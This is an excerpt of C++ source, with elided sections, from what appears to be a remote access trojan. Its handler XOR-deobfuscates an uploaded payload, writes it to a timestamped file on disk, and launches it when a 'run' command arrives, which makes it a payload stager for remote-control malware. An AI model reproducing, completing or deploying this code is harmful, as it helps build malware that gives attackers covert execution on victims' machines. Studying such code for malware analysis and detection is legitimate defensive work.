...
static void _preparePayload(std::vector<uint8_t> &Payload_Vector,
                            const std::string &Key_String) {
  HANDLER_DEBUG_LOG("Xoring the payload bytes to deobfuscate it");
  if (!Payload_Vector.empty()) {
    ::rat::encryption::xorData(Payload_Vector.data(), Payload_Vector.size(),
                               Key_String.c_str());
  }
}
...
_writePayloadIntoFilesystem(const std::vector<uint8_t> &Payload_Bytes) {
  ...
  const std::string &payload_name =
      fmt::format(payload_name_template, time_stamp);

  const auto &payload_path =
      std::filesystem::current_path() / std::filesystem::path(payload_name);

  std::ofstream out;
  try {
    // open in binary and throw exceptions on failure
    out.exceptions(std::ofstream::failbit | std::ofstream::badbit);
    out.open(payload_path.string(), std::ios::binary);

    HANDLER_DEBUG_LOG(
        "Writing deobfuscated payload bytes into the file system {}",
        payload_path.string());
    ...
    out.close();
    return {payload_path.string(), std::nullopt};
  } catch (const std::exception &e) {
    HANDLER_ERROR_LOG("Failed at writing the deobfuscated payload into "
                      "the file system {}: {}",
                      payload_path.string(), e.what());
    // Return error as string for easier storage / logging
    return {payload_path.string(), std::optional<std::string>(e.what())};
  }
}

void Handler::handleRunCommand() {
  {
    if (this->state.payload.size() == 0) {
      this->sendMessage("There is no payload to run upload one ");
      return;
    }
    ...
    const auto [payload_path, maybe_error] =
        _writePayloadIntoFilesystem(copied_payload);

    if (maybe_error) {
      HANDLER_ERROR_LOG("Cannot execute run command because payload "
                        "write failed: {}",
                        maybe_error.value());
      return;
    }
    ...
    HANDLER_DEBUG_LOG("Payload written to {}, now launching process.",
                      payload_path);
  }
